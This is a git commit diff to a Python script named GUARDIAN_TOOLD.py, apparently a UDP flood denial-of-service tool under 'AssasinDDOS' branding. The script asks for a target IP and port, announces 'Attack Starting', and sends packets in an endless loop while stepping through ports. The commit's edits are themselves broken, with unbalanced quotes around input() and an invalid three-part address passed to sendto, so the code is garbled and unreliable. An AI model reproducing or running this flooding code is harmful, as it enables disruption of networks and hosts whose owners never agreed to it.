8f8f98a0932b7d58ebc4d3d6613293aa3b2111b3
GOOD-OVERLEYIN <133844387+GOOD-OVERLEYIN@users.noreply.github.com>
2023-05-17 18:55:44 +0700

    Update GUARDIAN_TOOLD.py

--- GUARDIAN_TOOLD.py
+++ GUARDIAN_TOOLD.py
@@ -25,8 +25,8 @@ print ("You Tube : https://www.youtube.com/channel/UCCgy7i_A5yhAEdY86rPOinA")
 print ("github   : https://github.com/AssasimDDOS")
 print ("Facebook : https://www.facebook.com/AssasinDDOS")
 
-ip = input("IP Target : ")
-port = input("Port       : ")
+ip = str("input("IP Target : ")
+port = str("input("Port       : ")
 
 os.system("clear")
 os.system("figlet Attack Starting")
@@ -42,7 +42,7 @@ print ("[====================] 100%")
 time.sleep(3)
 sent = 0
 while True:
-     sock.sendto(bytes, (ip,port))
+     sock.sendto(bytes, (sent,ip,port))
      sent = sent + 1
      port = port + 1
      print ("Sent %s packet to %s throught port:%s")%(sent,ip,port)
